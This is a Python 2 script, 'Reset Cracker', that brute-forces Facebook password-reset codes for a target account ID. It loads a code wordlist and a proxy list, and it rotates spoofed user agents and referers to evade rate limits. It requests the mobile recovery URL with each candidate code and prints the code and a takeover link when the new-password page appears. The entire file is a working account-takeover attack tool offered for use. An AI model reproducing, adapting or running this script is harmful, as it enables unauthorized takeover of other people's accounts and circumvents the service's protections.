import urllib2
import urllib
import sys
import time
import random
import re
import os
import ssl
import time

useragent = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
	     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
	     'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	     'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	     'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	     'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	     'Opera/8.00 (Windows NT 5.1; U; en)',
	     'amaya/9.51 libwww/5.4.0',
	     'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	     'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	     'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	     'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	     'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	     'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]'
             "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)",
             "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre",
             "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;",
             "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
             "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
             "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)",
             "Microsoft Internet Explorer/4.0b1 (Windows 95)",
             "Opera/8.00 (Windows NT 5.1; U; en)",
             "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)",
             "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
             "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)",
             "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)",
             "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)",
             "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]",
             "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36",
             "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36 OPR/27.0.1689.66",
             "Opera/9.80 (J2ME/MIDP; Opera Mini/9 (Compatible; MSIE:9.0; iPhone; BlackBerry9700; AppleWebKit/24.746; U; en) Presto/2.5.25 Version/10.54",
             "Opera/9.80 (Android; Opera Mini/7.5.33361/31.1350; U; en) Presto/2.8.119 Version/11.10",
             "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
             "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
             "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
             "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
             "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0",
             "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
             "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
             "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
             "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
             "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.5 Safari/537.36",
             "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
             "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
             "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
             "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
             "Opera/9.80 (Windows NT 6.1; WOW64; U; pt) Presto/2.10.229 Version/11.62",
             "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
             "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
             "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
             "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"]   
referer = ['https://www.gmail.com/','https://www.yahoo.com','https://www.hotmail.com']

def cls():
        linux = 'clear'
        windows = 'cls'
        os.system([linux,windows][os.name == 'nt'])
     
cls()
     
os.system(['','color 11'][os.name == 'nt'])

print '''
       __               _                 _    
      / _|             | |               | |   
     | |_ __ _  ___ ___| |__   ___   ___ | | __
     |  _/ _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
     | || (_| | (_|  __/ |_) | (_) | (_) |   < 
     |_| \__,_|\___\___|_.__/ \___/ \___/|_|\_\\
				Reset Cracker by Tig3r`Bh4i
                                                                               '''
 
 
target = raw_input("Enter Target ID xD : ")
wordlist = raw_input("Copy Code-List Here  :")
proxylist= raw_input("Copy Proxy-list :p : ")


#Ungal bazi by ./VIRkid :v 

prox=[]
x = open(proxylist, 'r').readlines()
print ("Proxies Loaded {0}").format(len(x))
for each in x:
	each=each.replace("\n","")
	prox.append(each)



        
try:
#	print wordlist
	word = open(wordlist, 'r').readlines()
	print "[+] Facebook Codes Loaded \!/\n[+] Codes:",len(word)

except("IOError"):
	print "[-] Can't Load List !"
	sys.exit(1)



while True:

        for w in word:
            w = w.rstrip()
            cprox=random.choice(prox)
            try:
                print "Trying to Crack Using :",cprox
                proxy = urllib2.ProxyHandler({'http': cprox})
                opener = urllib2.build_opener(proxy ,urllib2.HTTPHandler)
                opener.addheaders = [('User-agent', random.choice(useragent)),('Referer', random.choice(referer)),('Connection', 'keep-alive')]
                urllib2.install_opener(opener)
                url = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(url).read()
                
		search = re.search('password_new', get)
                if search:
                        print "\n\n[+] Code Crack3D xD ==> "+w
                        print "\nUse this Link xD ===> https://facebook.com/recover/password?u="+target+"&n="+w
                        sys.exit(1)
                else:
                        print "[+] Wrong CodE :p ==> "+w

            except IOError:
                print " Error on Sending Page to server "